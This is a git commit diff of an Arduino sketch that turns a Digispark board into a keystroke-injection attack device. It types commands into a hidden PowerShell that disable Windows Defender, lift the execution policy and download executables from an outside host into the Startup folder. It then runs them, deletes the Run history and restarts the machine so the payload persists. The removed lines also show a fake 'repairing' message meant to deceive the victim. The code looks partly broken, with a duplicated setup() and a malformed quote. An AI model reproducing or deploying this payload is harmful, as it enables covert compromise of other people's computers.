af924d21e99703f58ed83f9a6462d09902c75f89
DataDucks <DataDucks.Web.Development@gmail.com>
2019-09-08 01:08:51 -0400

    Update sketch_aug12a.ino

--- sketch_aug12a.ino
+++ sketch_aug12a.ino
@@ -23,63 +23,61 @@ Please see "clippy.txt" for list of phrases.
  /* Init function */
 
     void setup() {
-      // don't need to set anything up to use DigiKeyboard
+      // Don't need to set anything up to use DigiKeyboard
     }
 
 
+   
+ #include "DigiKeyboard.h"
+ /* Init function */
+    void setup() {
+      // Don't need to set anything up to use DigiKeyboard
+    }
     void loop() {
-      // this is generally not necessary but with some older systems it seems to
-      // prevent missing the first character after a delay:
-      DigiKeyboard.sendKeyStroke(0);
-      
-      //turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
-      pinMode(1, OUTPUT); //LED on Model A
-      digitalWrite(1, HIGH);
-      DigiKeyboard.delay(500);
-      digitalWrite(1, LOW);
-      // Open powershell
-      DigiKeyboard.sendKeyStroke(0);
-      DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+     // Turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
+     pinMode(1, OUTPUT); //LED on Model A
+     digitalWrite(1, HIGH);
+     DigiKeyboard.delay(500);
+     digitalWrite(1, LOW);
+     DigiKeyboard.delay(100);
+     DigiKeyboard.sendKeyStroke(0);
+     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Opens up "RUN" again
+     DigiKeyboard.delay(100);
+     //DigiKeyboard.println(F("powershell")); // To see whats going on in powershell - uncomment to use WARNING: WILL NOT RUN ADMINISTRATOR MODE
+     DigiKeyboard.println(F("powershell -NoP -NonI -W Hidden -Exec Bypass")); // Launches Powershell hidden - uncomment to use  
+     DigiKeyboard.delay(2000);
+     // Disable Windows Defender
+      DigiKeyboard.println(F("Set-MpPreference -DisableRealtimeMonitoring $true"));
       DigiKeyboard.delay(100);
-      DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
-      DigiKeyboard.sendKeyStroke(KEY_ENTER);
-      DigiKeyboard.delay(1000);
-      DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
-      DigiKeyboard.delay(1000);
-
-      //Try to warn user to try and prevent user closing window
-      DigiKeyboard.print("DO NOT CLOSE THIS WINDOW!! WINDOWS REPAIRING "cxdrv(1).dll" REPAIRING MISSING FILE STRUCTURE");
-      DigiKeyboard.print("DO NOT CLOSE THIS WINDOW OR POSSIBLE CURRUPTION OF C: DRIVE");
-      DigiKeyboard.delay(2000);
-      DigiKeyboard.print("cls");
-      DigiKeyboard.sendKeyStroke(KEY_ENTER);
-      // Disable Windows Defender
-      DigiKeyboard.print("STRING Set-MpPreference -DisableRealtimeMonitoring $true");
+      DigiKeyboard.println(F("set-executionpolicy unrestricted")); // Unrestricted
       DigiKeyboard.delay(100);
-      DigiKeyboard.sendKeyStroke(KEY_ENTER);
+      DigiKeyboard.println(F("Y")); // Accept
       DigiKeyboard.delay(100);
-      DigiKeyboard.print("set-executionpolicy unrestricted");
-      DigiKeyboard.delay(500);
-      DigiKeyboard.sendKeyStroke(KEY_ENTER);
-      DigiKeyboard.delay(100);
-      // Execute code from the interwebs
-      // Modify 000.0.0.0 with your IP address
-      DigiKeyboard.print("$StartupDir = [environment]::getfolderpath('Startup');cd $StartupDir;mkdir clippy;cd clippy;Invoke-WebRequest \"http://000.0.0.0/clippy.exe\" -OutFile \clippy.exe\";Invoke-WebRequest \"http://000.0.0.0/clippy.txt\" -OutFile \"clippy.txt\";Invoke-WebRequest \"http://000.0.0.0/clippy.vbs\" -OutFile \"clippy.vbs\"");
+      // Execute code from the interwebs modify 000.0.0.0 with your IP address (192.168.0.0, 127.0.0.1, etc.)
+      DigiKeyboard.println(F("$StartupDir = [environment]::getfolderpath('Startup');cd $StartupDir;mkdir clippy;cd clippy;Invoke-WebRequest \"http://000.0.0.0/clippy.exe\" -OutFile \clippy.exe\";Invoke-WebRequest \"http://dataducks.3utilities.com/download/clippy.txt\" -OutFile \"clippy.txt\";Invoke-WebRequest \"http://000.0.0.0/clippy.vbs\" -OutFile \"clippy.vbs\""));
       DigiKeyboard.delay(100);
       DigiKeyboard.sendKeyStroke(KEY_ENTER);
       DigiKeyboard.delay(100);
       // Execute clippy.exe
-      DigiKeyboard.print("./clippy.exe");
+      DigiKeyboard.println(F("./clippy.exe"));
       DigiKeyboard.delay(100);
       DigiKeyboard.sendKeyStroke(KEY_ENTER);
       DigiKeyboard.delay(100);
       // Execute clippy.txt
-      DigiKeyboard.print("./clippy.vbs");
+      DigiKeyboard.println(F("./clippy.vbs"));
       DigiKeyboard.delay(100);
       DigiKeyboard.sendKeyStroke(KEY_ENTER);
       DigiKeyboard.delay(1000);
+      // Clear run command history
+      DigiKeyboard.println(F("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f"));
+      DigiKeyboard.delay(100);
+      DigiKeyboard.sendKeyStroke(KEY_ENTER);
+      DigiKeyboard.delay(100);
+      // Led on
+      digitalWrite(1, HIGH);
       // Restart computer payload will execute on startup ($StartupDir = [environment]::getfolderpath('Startup'))
-      DigiKeyboard.print("Restart-Computer");
+      DigiKeyboard.println(F("Restart-Computer"));
+  
       while(true){
         //do nothing
       }
